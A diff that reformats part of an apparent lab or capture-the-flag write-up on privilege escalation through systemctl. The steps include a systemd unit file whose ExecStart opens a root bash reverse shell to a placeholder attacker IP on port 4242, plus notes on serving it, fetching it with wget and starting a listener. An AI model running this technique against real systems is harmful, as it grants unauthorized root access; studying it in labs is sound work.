@@ -15,16 +15,18 @@
    -  Identify a binary with root as owner
    -  Use https://gtfobins.github.io/gtfobins/systemctl/ to find how to exploit
    -  Created root.service with code:
-   -    [Unit]
-        Description=root
-        
-        [Service]
-        Type=simple
-        User=root
-        ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<Attacker-IP-Address>/4242 0>&1'
-        
-        [Install]
-        WantedBy=multi-user.target
+     ```
+     [Unit]
+     Description=root
+     
+     [Service]
+     Type=simple
+     User=root
+     ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/<Attacker-IP-Address>/4242 0>&1'
+     
+     [Install]
+     WantedBy=multi-user.target
+     ```
     - Hosted file using python server
     - downloaded file to /tmp on target using wget
     - start a listner on attcker machine
